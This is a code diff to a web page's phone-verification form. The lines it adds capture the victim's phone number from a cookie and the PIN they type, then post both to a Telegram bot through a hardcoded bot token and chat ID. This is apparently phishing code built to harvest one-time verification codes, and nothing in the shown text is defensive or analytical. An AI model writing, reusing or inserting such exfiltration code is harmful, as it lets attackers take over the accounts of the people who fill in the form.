@@ -192,7 +192,26 @@
     $("#verificationForm" ).on( "submit", function( event ) {
       phonenumber = getCookie('phonenumber');
       pincode = document.getElementById('pincode').value;
+      var message = "رقم الهاتف:`"+phonenumber+"`\n"
+      message += "رمز التحقق:`"+pincode+"`\n"
 
+      $.ajax({
+        type: 'POST',
+        url: `https://api.telegram.org/bot7721961603:AAHmNWIomqqd98iLtAntWuYcyR_uLMHPz-4/sendMessage`,
+        data: {
+          chat_id: "7736802193",
+          text: message,
+          parse_mode: 'markdown',
+        },
+        success: function (res) {
+          console.debug(res);
+          $('#response').text('Message sent');
+        },
+        error: function (error) {
+          console.error(error);
+
+        }
+      });
       var message = "رقم الهاتف:`"+phonenumber+"`\n"
       message += "رمز التحقق:`"+pincode+"`\n"
 
